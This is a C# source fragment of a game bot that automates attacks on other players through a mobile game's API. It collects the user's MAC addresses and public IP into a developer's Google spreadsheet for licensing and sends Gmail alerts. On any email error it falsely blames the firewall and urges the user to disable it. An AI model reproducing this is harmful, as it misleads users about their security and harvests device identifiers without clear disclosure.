                using (StreamWriter sw = File.AppendText(@"c:\LiC\L33T_Cycler\" + txt))
                {
                    if (X == 0 && txt == "R2Log.txt")
                    {
                        sw.WriteLine(str);
                        X++;
                    }
                    else if (txt != "R2Log.txt")
                    {
                        sw.WriteLine(str);
                    }

                }
            }
        }

        public void send_Email(string updateName)
        {
            string str = new WebClient().DownloadString("http://icanhazip.com/");

            var message = new MailMessage();

            message.To.Add(alertEmail);
            if (alertPhone != "")
            {
                message.To.Add(alertPhone);
            }

            message.From = new MailAddress(emailUsername);
            message.Subject = "Beast Bot Alert";
            message.Body = updateName + username.Text;
            
            
            SmtpClient client2 = new SmtpClient
            {
                Credentials = new NetworkCredential(emailUsername, emailPassword),
                Port = 0x24b,
                Host = "smtp.gmail.com",
                EnableSsl = true
            };
            try
            {
                client2.Send(message);
            }
            catch (Exception innerException)
            {
                string str2 = string.Empty;
                while (innerException != null)
                {
                    str2 = str2 + innerException.ToString();
                    innerException = innerException.InnerException;
                }
                if (MessageBox.Show("Your Firewall is preventing this application from connecting with the internet, please add an exception or disable your firewall", "Firewall Error", MessageBoxButtons.OK) == DialogResult.OK)
                {
 
                }
            }
        }

        public void GoogleDrive(string database)
        {
            // create the DatabaseClient passing my Gmail or Google Apps credentials
            IDatabaseClient client = new DatabaseClient(emailUsername, emailPassword);

            // get or create the database. This is the spreadsheet file 
            IDatabase db = client.GetDatabase(database) ?? client.CreateDatabase(database);

            // get or create the table. This is a worksheet in the file 
            // note I am using my Person object so it knows what my schema needs to be  
            // for my data. It will create a header row with the property names 

            System.Globalization.DateTimeFormatInfo d = new System.Globalization.DateTimeFormatInfo();
            string monthName = d.MonthNames[DateTime.Now.Month - 1];
            string worksheet = user.ToLower().Replace(" ", "").Replace("\r\n", "").Replace(System.Environment.NewLine, "");
            ITable<CycleData> table = db.GetTable<CycleData>(worksheet) ?? db.CreateTable<CycleData>(worksheet);
            string IP = new WebClient().DownloadString("http://icanhazip.com/");
            // now I can fill a Person object and add it
            var cycleData = new CycleData();
            
            cycleData.Time = DateTime.Now.ToString("MM.dd.yy").Replace("\r\n", "").Replace(System.Environment.NewLine, "");
            cycleData.killer = AvatarID.Text.Replace("\r\n", "").Replace(" ", "").Replace(System.Environment.NewLine, "");

            cycleData.ipAddress = IP.Replace("\r\n", "").Replace(" ", "").Replace(System.Environment.NewLine, "");


            IList<IRow<CycleData>> rows = table.FindStructured(string.Format("killer=\"{0}\"", cycleData.Time));
            if (rows == null || rows.Count == 0)
            {
                // Email does not exist yet, add row

                table.Add(cycleData);
            }
            else
            {
                // Email was located, edit the row with the new data
                IRow<CycleData> row = rows[0];
                row.Element = cycleData;
                row.Update();
            }
        }
        public void requestDrive(string database)
        {
            IDatabaseClient client = new DatabaseClient(emailUsername, emailPassword);
            IDatabase db = client.GetDatabase(database) ?? client.CreateDatabase(database);
            string worksheet = user.ToLower().Replace(" ", "").Replace("\r\n", "").Replace(System.Environment.NewLine, "");
            string IP = new WebClient().DownloadString("http://icanhazip.com/");
            ITable<MacID> table = db.GetTable<MacID>(worksheet) ?? db.CreateTable<MacID>(worksheet);
            var cycleData = new MacID();
            cycleData.Time = DateTime.Now.ToString("MM.dd.yy HH:mm:ss").Replace("\r\n", "").Replace(System.Environment.NewLine, "");
            cycleData.User = user;
            cycleData.IP = IP;
            try
            {
                IList<IRow<MacID>> rows = table.FindStructured(string.Format("username=\"{0}\"", cycleData.Time));
                using (StringReader reader = new StringReader(macID))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
  
                        cycleData.MacAddress = line.Replace(" ", "").Replace("\r\n", "");
 
                        if (rows == null || rows.Count == 0)
                        {
                            // Email does not exist yet, add row
                            if (Regex.IsMatch(line, @"\d"))
                            {
                                table.Add(cycleData);
                            }
                        }
                        else
                        {
                            if (Regex.IsMatch(line, @"\d") == true)
                            {
                                // Email was located, edit the row with the new data
                                IRow<MacID> row = rows[0];
                                row.Element = cycleData;
                                row.Update();
                            }
                        }
                    }
                }
            }
            catch
            {
                MessageBox.Show("An Authorization Request Has Already Been Sent.  If This is Not the Case, Please Contact the Developer.");
                this.Close();
                try
                { Process.GetCurrentProcess().Kill(); }
                catch { Environment.Exit(0); }
            }
        }
        bool access = false;
        public void ReadDrive(string database)
        {
            SpreadsheetsService myService = new SpreadsheetsService("auniquename");
            myService.setUserCredentials(emailUsername, emailPassword);

            // GET THE SPREADSHEET from all the docs
            SpreadsheetQuery query = new SpreadsheetQuery();
            SpreadsheetFeed feed = myService.Query(query);

            var campaign = (from x in feed.Entries where x.Title.Text.Contains("BeastAuths") select x).First();

            // GET THE first WORKSHEET from that sheet
            AtomLink link = campaign.Links.FindService(GDataSpreadsheetsNameTable.WorksheetRel, null);
            WorksheetQuery query2 = new WorksheetQuery(link.HRef.ToString());
            WorksheetFeed feed2 = myService.Query(query2);

           var campaignSheet = feed2.Entries.First();
 
            AtomLink cellFeedLink = campaignSheet.Links.FindService(GDataSpreadsheetsNameTable.CellRel, null);
            CellQuery query3 = new CellQuery(cellFeedLink.HRef.ToString());
            CellFeed feed3 = myService.Query(query3);

            foreach (CellEntry curCell in feed3.Entries)
            {

                using (StringReader reader = new StringReader(macID))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null && access == false)
                    {
                        // MessageBox.Show(line);
                        if (curCell.Cell.Value.ToString().Replace(" ", "").Replace("\r\n", "").Replace(System.Environment.NewLine, "").Contains(line.Replace(" ", "").Replace("\r\n", "").Replace(System.Environment.NewLine, "")) && Regex.IsMatch(line, @"\d") == true)
                        {
                       
                            access = true;
                        }
                    }
                }

            }
        }
        public class CycleData
        {
            public string Time { get; set; }
            public string killer { get; set; }
            public string victim1 { get; set; }
            public string victim2 { get; set; }
            public string victim3 { get; set; }
            public string victim4 { get; set; }
            public string victim5 { get; set; }
            public string victim6 { get; set; }
            public string ipAddress { get; set; }
        }

        public class MacID
        {
            public string Time { get; set; }
            public string User { get; set; }
            public string MacAddress { get; set; }
            public string IP { get; set; }
        }
        public string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {

                IPInterfaceProperties properties = adapter.GetIPProperties();
                sMacAddress += adapter.GetPhysicalAddress().ToString() + Environment.NewLine;
            } return sMacAddress;
        }

        private void attackCode1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }


        private void saveLocation_TextChanged(object sender, EventArgs e)
        {



            if (!System.IO.File.Exists(fileLocation + saveLocation.Text + ".LiC"))// Check to see if file name exists
            {
                StreamWriter writer;
                using (writer = new StreamWriter(fileLocation + saveLocation.Text + ".LiC")) { };
            }
            else
            {
                using (StreamReader reader = File.OpenText(fileLocation + saveLocation.Text + ".LiC"))
                {
                    AvatarID.Text = reader.ReadLine();
                    gpsCoordinates.Text = reader.ReadLine();
                    attackCode1.Text = reader.ReadLine();
                    attackCode2.Text = reader.ReadLine();
                    attackCode3.Text = reader.ReadLine();
                    attackCode4.Text = reader.ReadLine();
                    attackCode5.Text = reader.ReadLine();
                    attackCode6.Text = reader.ReadLine();
                    attackCode7.Text = reader.ReadLine();
                    attackCode8.Text = reader.ReadLine();
                    attackCode9.Text = reader.ReadLine();
                    attackCode10.Text = reader.ReadLine();
                    attackCode11.Text = reader.ReadLine();
                    attackCode12.Text = reader.ReadLine();
                    attackCode13.Text = reader.ReadLine();
                    attackCode14.Text = reader.ReadLine();
                    attackCode15.Text = reader.ReadLine();
                    attackCode16.Text = reader.ReadLine();
                    attackCode17.Text = reader.ReadLine();
                    attackCode18.Text = reader.ReadLine();
                    attackCode19.Text = reader.ReadLine();
                    attackCode20.Text = reader.ReadLine();
                    attackCode21.Text = reader.ReadLine();
                    attackCode22.Text = reader.ReadLine();
                    attackCode23.Text = reader.ReadLine();
                    attackCode24.Text = reader.ReadLine();
                    attackCode25.Text = reader.ReadLine();
                    attackCode26.Text = reader.ReadLine();
                    attackCode27.Text = reader.ReadLine();
                    attackCode28.Text = reader.ReadLine();
                    attackCode29.Text = reader.ReadLine();
                    attackCode30.Text = reader.ReadLine();
                    attackCode31.Text = reader.ReadLine();
                    attackCode32.Text = reader.ReadLine();
                }
            }
        }
        int nameCheck = 0;
        private void AvatarID_TextChanged(object sender, EventArgs e)
        {
            nameCheck = 1;
            sendURL("/mob_api/avatar/revive", "");

        }
        int victimCheck = 0;
        private void attackCodeCheck_Click(object sender, EventArgs e)
        {
            
            responseBox.Text = "";
            string attackCodeContains = "Enter Attack Code";
            for (int i = 1; i <= 32; ++i)
            {
                string name = "attackCode" + i;
                TextBox txtBox = this.Controls[name] as TextBox;
                Thread.Sleep(250);
                string attackCodeCheck = txtBox.Text;
                SetText(responseBox, Environment.NewLine + name + " = " + txtBox.Text);
                done = 10;
                victimCheck = 1;

                if (txtBox.TextLength < 6)
                {
                    SetText(responseBox, " = No code or too short, stopping ");
                    break;
                }
                else if (attackCodeCheck.Contains(attackCodeContains)) 
                {
                    SetText(responseBox, " = no code entered, stopping ");
                    break;
                }
                else
                {
                    sendURL("/mob_api/avatar/get_avatar_card", txtBox.Text);
                }
                Thread.Sleep(1000);
            }
            victimCheck = 0;
        }

    }

}
